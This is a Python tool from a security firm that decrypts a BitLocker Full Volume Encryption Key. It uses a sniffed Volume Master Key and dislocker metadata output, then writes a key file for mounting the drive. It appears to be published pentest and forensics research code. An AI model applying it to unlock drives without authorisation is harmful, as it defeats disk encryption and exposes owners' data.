#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  BitLocker Key Decryptor

  by Matthias Deeg (@matthiasdeeg, matthias.deeg@syss.de)

  Python tool to decrypt an encrypted Full Volume Master Key (FVMK)
  of an BitLocker-encrypted partition

  Copyright (C) 2020 Matthias Deeg, SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '0.2'
__author__ = 'Matthias Deeg'

import argparse
import re

from binascii import unhexlify
from Crypto.Cipher import AES
from sty import fg, ef
from sys import exit

# some regular expressions
REGEX_SIZE = re.compile(r"^.*\((?P<size>\d+)\) bytes.*")
REGEX_DATA = re.compile(r"^.*\[INFO\] (?P<data>.*)\n$")
REGEX_PAYLOAD = re.compile(r"^.*\[INFO\] (?P<address>[0-9a-fx]+) (?P<data>.*)\n$")

# some definitions
FVEK_FILE = "fvek.bin"


def banner():
    """Show a fancy banner"""

    print(fg.li_white + "\n" +
"""  ___ _ _   _            _             _____   _____ _  __  ___                       _   \n"""
""" | _ |_) |_| |   ___  __| |_____ _ _  | __\ \ / / __| |/ / |   \ ___ __ _ _ _  _ _ __| |_ \n"""
""" | _ \ |  _| |__/ _ \/ _| / / -_) '_| | _| \ V /| _|| ' <  | |) / -_) _| '_| || | '_ \  _|\n"""
""" |___/_|\__|____\___/\__|_\_\___|_|   |_|   \_/ |___|_|\_\ |___/\___\__|_|  \_, | .__/\__|\n"""
"""                                                                            |__/|_|       \n"""
"""BitLocker FVEK Decrypt v{0} by Matthias Deeg - SySS GmbH\n""".format(__version__) + fg.rs +
"""Decrypts encrypted BitLocker Full Volume Encryption Keys (FVEK)\n---""")


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # init command line parser
    parser = argparse.ArgumentParser("./bitlocker_key_decryptor.py")
    parser.add_argument('-f', '--filename', type=str, required=True, help='File with dislocker-metadata output of targeted BitLocker-encrypted partition')
    parser.add_argument('-k', '--keyfile', type=str, required=True, help='File with sniffed BitLocker Volume Master Key (VMK)')

    # parse command line arguments
    args = parser.parse_args()

    # read VMK from file
    try:
        with open(args.keyfile, "rb") as f:
            vmk = f.read()
    except:
        print(fg.li_red + "[-] Error: Could not read the Volume Master Key (VMK) from the specified key file" + fg.rs)
        exit(1)

    with open(args.filename, "r") as f:
        # read whole file
        data = f.readlines()

        # search for encrypted FVEK
        i = 0
        for l in data:
            if l.find("Datum entry type: 3") != -1:
                break
            i += 1

        # parse data in a hacky way
        fvek_data = data[i - 1:i + 14]

        # read payload size
        m = REGEX_SIZE.match(fvek_data[0])
        size = int(m.group("size"))

        # read nonce
        m = REGEX_DATA.match(fvek_data[7])
        nonce = unhexlify(m.group("data").replace(" ", ""))
        print(fg.li_blue + "[+] Extracted nonce:\n    {}".format(nonce.hex()) + fg.rs)

        # read MAC
        m = REGEX_DATA.match(fvek_data[9])
        mac = unhexlify(m.group("data").replace(" ", ""))
        print(fg.li_blue + "[+] Extracted MAC:\n    {}".format(mac.hex()) + fg.rs)

        # read payload (encrypted FVEK)
        payload_size = size - len(nonce) - len(mac)

        line_count = payload_size // 16
        if payload_size % 16 != 0:
            line_count += 1

        encrypted_fvek = b""
        for i in range(line_count - 1):
            m = REGEX_PAYLOAD.match(fvek_data[11 + i])
            encrypted_fvek += unhexlify(m.group("data").replace(" ", "").replace("-", ""))
        print(fg.li_blue + "[+] Extracted payload:\n    {}".format(encrypted_fvek.hex()) + fg.rs)

        # initialize AES-CCM with given VMK and nonce
        cipher = AES.new(vmk, AES.MODE_CCM, nonce=nonce)

        try:
            # decrypt and verify encrypted Full Volume Master Key (FVMK)
            plaintext = cipher.decrypt_and_verify(encrypted_fvek, mac)
            decrypted_fvek = plaintext[12:]
            print(fg.li_green + "[+] Decrypted Full Volume Encryption Key (FVEK):\n    {}".format(decrypted_fvek.hex()) + fg.rs)

            # write FVEK file for use with dislocker
            with open(FVEK_FILE, "wb") as f:
                f.write(b"\x00\x80")
                f.write(decrypted_fvek)
                f.write(b"\x00" * 32)
                print(fg.li_green + "[+] Created FVEK file '{}' for use with dislocker".format(FVEK_FILE) + fg.rs)

        except KeyError:
            print("[-] Error: Could not decrypt the encrypted Full Volume Encryption Key (FVEK)")
